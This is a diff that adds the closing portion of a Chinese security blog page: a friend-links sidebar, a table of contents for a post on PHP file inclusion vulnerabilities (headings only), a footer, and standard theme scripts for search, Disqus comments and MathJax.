+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://010.dropsec.xyz/" title="小光头" target="_blank">小光头</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.w2n1ck.com/" title="个人主页" target="_blank">个人主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-什么是文件包含漏洞？"><span class="nav-number">1.</span> <span class="nav-text">0x01 什么是文件包含漏洞？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-文件包含漏洞产生的原因？"><span class="nav-number">2.</span> <span class="nav-text">0x02 文件包含漏洞产生的原因？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-PHP包含漏洞分类"><span class="nav-number">3.</span> <span class="nav-text">0x03 PHP包含漏洞分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-本地文件包含"><span class="nav-number">4.</span> <span class="nav-text">0x04 本地文件包含</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-远程文件包含"><span class="nav-number">5.</span> <span class="nav-text">0x05 远程文件包含</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-文件包含漏洞实例"><span class="nav-number">6.</span> <span class="nav-text">0x06 文件包含漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-1-本地文件包含实例"><span class="nav-number">6.0.1.</span> <span class="nav-text">0x06_1 本地文件包含实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-2-远程文件包含实例"><span class="nav-number">6.0.2.</span> <span class="nav-text">0x06_2 远程文件包含实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-2-1-编写脚本测试"><span class="nav-number">6.0.3.</span> <span class="nav-text">0x06_2.1 编写脚本测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-文件包含漏洞利用技巧"><span class="nav-number">7.</span> <span class="nav-text">0x06 文件包含漏洞利用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-1-PHP包含读文件"><span class="nav-number">7.0.1.</span> <span class="nav-text">0x06_1 PHP包含读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-2-PHP包含写文件"><span class="nav-number">7.0.2.</span> <span class="nav-text">0x06_2 PHP包含写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-3-包含日志文件"><span class="nav-number">7.0.3.</span> <span class="nav-text">0x06_3 包含日志文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-4-截断包含"><span class="nav-number">7.0.4.</span> <span class="nav-text">0x06_4 截断包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-5-PHP内置协议"><span class="nav-number">7.0.5.</span> <span class="nav-text">0x06_5 PHP内置协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-6-包含Session文件。"><span class="nav-number">7.0.6.</span> <span class="nav-text">0x06_6 包含Session文件。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-7-包含-proc-self-environ文件。"><span class="nav-number">7.0.7.</span> <span class="nav-text">0x06_7 包含/proc/self/environ文件。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补充"><span class="nav-number">7.1.</span> <span class="nav-text">补充</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w2n1ck</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2016/07/19/文件包含漏洞总结/';
+          this.page.identifier = '2016/07/19/文件包含漏洞总结/';
+          this.page.title = '文件包含漏洞总结';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="255,0,0" opacity='0.7' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
